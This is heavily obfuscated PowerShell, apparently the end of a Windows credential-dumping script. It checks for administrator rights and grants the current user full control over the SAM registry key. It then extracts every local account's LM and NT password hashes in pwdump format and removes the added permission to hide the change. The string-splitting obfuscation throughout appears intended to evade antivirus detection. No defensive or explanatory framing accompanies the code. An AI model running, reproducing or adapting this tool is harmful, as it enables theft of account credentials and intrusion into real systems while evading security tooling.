            &("{0}{2}{1}" -f 'Add','ember','-M') ("{3}{2}{1}{0}" -f'erty','ptProp','cri','S') ("{0}{1}{2}" -f'Ha','sh','Offset') { ( get-vAriAbLe  ('g'+'uXp'))."val`UE"::("{1}{0}"-f'nt32','ToUI').Invoke(${tH`Is}.("{1}{0}{2}"-f 'tValu','Ge','e').Invoke("V")[0x9c..0x9f],0) + 0xCC} -PassThru
}

function DU`MPHASH`ES
{
    &("{2}{0}{1}"-f'A','pi','Load')
    ${boOt`k`ey} = &("{0}{3}{2}{1}"-f 'Get-','Key','oot','B');
    ${hboot`K`Ey} = &("{3}{1}{2}{0}"-f'HBootKey','e','t-','G') ${B`oO`TkEy};
    &("{2}{0}{3}{1}" -f'ser','s','Get-U','Key') | &('%'){
        ${hA`s`hES} = &("{0}{3}{1}{2}" -f'Get-','erHas','hes','Us') ${_} ${H`BOo`TK`EY};
        if(${PsOb`jECT`F`orM`At})
        {
            ${CRe`ds} = &("{0}{1}{2}" -f 'N','ew-Obje','ct') ("{1}{0}{2}"-f'je','psob','ct')
            ${c`R`EDS} | &("{1}{2}{0}"-f '-Member','A','dd') -MemberType ("{0}{1}{2}{3}" -f 'Note','Pro','p','erty') -Name ("{0}{1}" -f'Na','me') -Value ${_}."US`ERNAME"
            ${c`ReDS} | &("{0}{2}{1}" -f 'Ad','mber','d-Me') -MemberType ("{2}{3}{1}{0}"-f 'y','Propert','No','te') -Name ('id') -Value ${_}."r`id"
            ${cr`eDs} | &("{1}{2}{0}" -f'mber','Add-','Me') -MemberType ("{1}{3}{2}{0}" -f 'y','N','ePropert','ot') -Name ('lm') -Value (  (VARiaBLE guxp  -vAlu  )::"tosT`R`ing"(${h`ASHES}[0])).("{0}{1}{2}"-f'R','ep','lace').Invoke("-","").("{1}{2}{0}" -f'Lower','T','o').Invoke()
            ${CRe`DS} | &("{1}{3}{2}{0}"-f'r','Add-','mbe','Me') -MemberType ("{0}{1}{3}{2}"-f'Note','P','rty','rope') -Name ("{1}{0}" -f'lm','nt') -Value (  $gUxp::"tostR`ING"(${HA`Sh`ES}[1])).("{1}{0}" -f 'place','Re').Invoke("-","").("{1}{0}"-f'wer','ToLo').Invoke()
            ${Cre`DS}
        }
        else
        {
            "{0}:{1}:{2}:{3}:::" -f (${_}."Us`ErN`Ame",${_}."R`Id",
             ( cHILDIteM  ('v'+'Ar'+'iaBle'+':G'+'uxP')  )."Va`LUe"::"ToStri`NG"(${H`AS`hes}[0]).("{1}{0}{2}"-f 'la','Rep','ce').Invoke("-","").("{1}{2}{0}" -f'Lower','T','o').Invoke(),
             (LS VarIaBLE:guXP )."V`ALue"::"TOST`R`InG"(${hash`ES}[1]).("{1}{0}" -f 'ce','Repla').Invoke("-","").("{1}{0}"-f'ower','ToL').Invoke());
        }
    }
}

    
    if (-NOT ([Security.Principal.WindowsPrincipal]  (dIR  ('V'+'aRia'+'b'+'LE:1iy'+'oK') )."Va`LuE"::("{3}{0}{2}{1}"-f't','nt','Curre','Ge').Invoke())."IS`in`RoLe"([Security.Principal.WindowsBuiltInRole] ("{3}{1}{0}{4}{2}" -f 'istra','min','r','Ad','to')))
    {
        &("{3}{0}{1}{2}"-f'it','e','-Warning','Wr') ("{1}{5}{3}{0}{4}{6}{7}{8}{9}{2}" -f't requires ','S','s.','rip','elevated o','c','r',' administrative priv','i','lege')
        Return
    } 
    else
    {
        
        ${R`ULe} = &("{0}{1}{2}"-f'New','-','Object') ("{0}{13}{3}{11}{10}{6}{12}{7}{8}{4}{1}{5}{2}{9}" -f 'S','yAcc','sRul','.','r','es','y.Acces','trol.Regis','t','e','ecurit','S','sCon','ystem') (
          ( VAriaBlE ('a94x'+'t'))."Val`uE"::("{2}{1}{3}{0}"-f'nt','tCurr','Ge','e').Invoke()."n`AME",
        ("{0}{2}{1}{3}"-f'FullCon','r','t','ol'),
        [System.Security.AccessControl.InheritanceFlags]("{0}{4}{3}{5}{1}{2}"-f 'ObjectInh','ntai','nerInherit','ri','e','t,Co'),
        [System.Security.AccessControl.PropagationFlags]("{1}{0}"-f 'e','Non'),
        [System.Security.AccessControl.AccessControlType]("{1}{0}" -f 'w','Allo'))
        ${K`EY} =  (  variaBlE 76hUWG  -valUEONLy  )::"lO`Cal`machINE".("{0}{2}{3}{1}"-f'Ope','Key','n','Sub').Invoke(
        (("{4}{3}{1}{0}{2}"-f 'A','Mi9sS','Mi9sDomains','A','S'))."rePl`Ace"(([CHAR]105+[CHAR]57+[CHAR]115),[stRIng][CHAR]92),
         $GtXE5h::"rEA`Dwr`ItES`UbtrEe",
         (  Gi  ("V"+"arI"+"aBLE:fOl21") )."V`ALuE"::"CHangE`Pe`R`MissIo`NS")
        ${a`cL} = ${k`Ey}.("{2}{1}{0}"-f'trol','etAccessCon','G').Invoke()
        ${a`Cl}.("{3}{1}{0}{2}"-f'Ru','cess','le','SetAc').Invoke(${R`Ule})
        ${k`Ey}.("{0}{2}{3}{4}{1}"-f 'SetAcc','ol','e','s','sContr').Invoke(${a`CL})

        &("{2}{3}{0}{1}" -f'Hash','es','Du','mp')

        
        ${Us`Er} =   (  lS  VarIaBLe:A94xt )."V`AluE"::("{0}{1}{2}"-f 'Get','Curr','ent').Invoke()."Na`Me"
        ${a`cl}."ac`c`ess" | &("{1}{0}" -f 'ere','wh') {${_}."IDEN`TityR`EfEr`E`N`ce"."V`ALUe" -eq ${u`sEr}} | &('%'){${A`Cl}.("{5}{2}{1}{3}{4}{0}"-f 'Rule','eA','v','cce','ss','Remo').Invoke(${_})} | &("{0}{2}{1}" -f 'O','t-Null','u')
        &("{1}{2}{0}"-f'l','Set-A','c') ((("{4}{2}{0}{1}{3}" -f'Zo','9SAMZo9SAMZo9D','LM:','omains','HK'))-CrEPlAce([ChAr]90+[ChAr]111+[ChAr]57),[ChAr]92) ${a`Cl}

    }
}
